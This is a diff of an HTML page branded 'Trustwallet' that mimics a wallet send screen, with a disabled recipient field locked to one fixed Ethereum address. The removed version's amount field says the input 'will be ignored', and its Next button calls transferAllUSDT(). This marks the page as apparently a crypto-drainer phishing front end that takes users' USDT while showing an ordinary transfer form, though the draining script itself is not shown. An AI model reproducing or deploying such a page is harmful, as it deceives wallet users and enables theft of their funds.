@@ -1,123 +1,40 @@
-<!DOCTYPE html>
-<html lang="en">
+
+<html lang="en" data-arp="">
 
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta name="theme-color" content="#000000">
-  <meta name="trustwallet-dapp" content="true">
-  <title>Trustwallet</title>
-  <link rel="icon" href="/logo.png">
-  <link rel="apple-touch-icon" href="/logo.png">
-  <link rel="manifest" href="/manifest.json">
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <link rel="stylesheet" href="./style.css">
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background-color: #0b0f19;
-      color: #ffffff;
-      font-family: Arial, sans-serif;
-    }
-
-    #root {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .container {
-      background-color: #1c1f2a;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
-      width: 90%;
-      max-width: 400px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-size: 14px;
-      font-weight: bold;
-    }
-
-    input[type="text"],
-    input[type="number"] {
-      width: 100%;
-      padding: 10px;
-      border-radius: 8px;
-      border: none;
-      margin-bottom: 10px;
-      background-color: #2a2e3f;
-      color: white;
-      font-size: 16px;
-    }
-
-    .input-group {
-      position: relative;
-    }
-
-    .input-group span {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #00ffcc;
-      cursor: pointer;
-      font-size: 14px;
-    }
-
-    button {
-      background-color: #22c55e;
-      color: white;
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-
-    button:hover {
-      background-color: #16a34a;
-    }
-
-    .status {
-      margin-top: 20px;
-      color: #00ffcc;
-      font-size: 14px;
-    }
-  </style>
+    <meta charset="utf-8">
+    <link rel="icon" href="/logo.png">
+    <meta name="trustwallet-dapp" content="true">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Web site created using create-react-app">
+    <link rel="apple-touch-icon" href="/logo.png">
+    <link rel="manifest" href="/manifest.json">
+    <title>Trustwallet</title>
+    <script defer="defer" src="./static/js/main.a4c29559.js"></script>
+    <link href="./static/css/main.e6c13ad2.css" rel="stylesheet">
+    <style data-styled="active" data-styled-version="6.1.16"></style>
 </head>
 
-<body>
-  <div id="root">
-    <div class="container">
-      <div>
-        <label>Address</label>
-        <div class="input-group">
-          <input type="text" value="0xaE1C1312cC81A63be62848F7a201dAeE013E7710" disabled>
-          <span>Paste</span>
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+        <div class="sc-VHjGu csbCxp">
+            <div class="sc-gnOvAp hgrUZD">
+                <div class="sc-dOfePm ezZebS"><label class="sc-jgmqJh jdySqT">Address</label>
+                    <div class="sc-gIIpAQ bCcZzg"><span class="sc-ihGilW gujIR">×</span><input  class="sc-kFkjun dPtsqv"
+                            type="text" value="0xaE1C1312cC81A63be62848F7a201dAeE013E7710" disabled><span
+                            class="sc-jRLeyu kakqtx">Paste</span></div>
+                </div>
+                <div class="sc-dOfePm ezZebS"><label class="sc-jgmqJh jdySqT">Amount</label>
+                    <div class="sc-cOPLXt hxYDhx">
+                        <div class="sc-gIIpAQ bCcZzg"><input class="sc-kFkjun dPtsqv" type="number" value=""><span
+                                class="sc-cRHGzb gHdQby">USDT</span><span class="sc-jOTjWM gqxQNl">Max</span></div>
+                    </div>
+                    <p class="sc-cXrvCr fUwUnJ">= $0.00</p>
+                </div><button class="sc-jXuTBK gunmRG">Next</button>
+            </div>
         </div>
-      </div>
-      <div>
-        <label>Amount</label>
-        <div class="input-group">
-          <input id="amount" type="number" placeholder="Enter amount (will be ignored)">
-          <span onclick="setMax()">Max</span>
-        </div>
-        <p>= $0.00</p>
-      </div>
-      <button onclick="transferAllUSDT()">Next</button>
-      <div id="status" class="status"></div>
     </div>
-  </div>
-
-  <script src="script.js"></script>
 </body>
 
 </html>
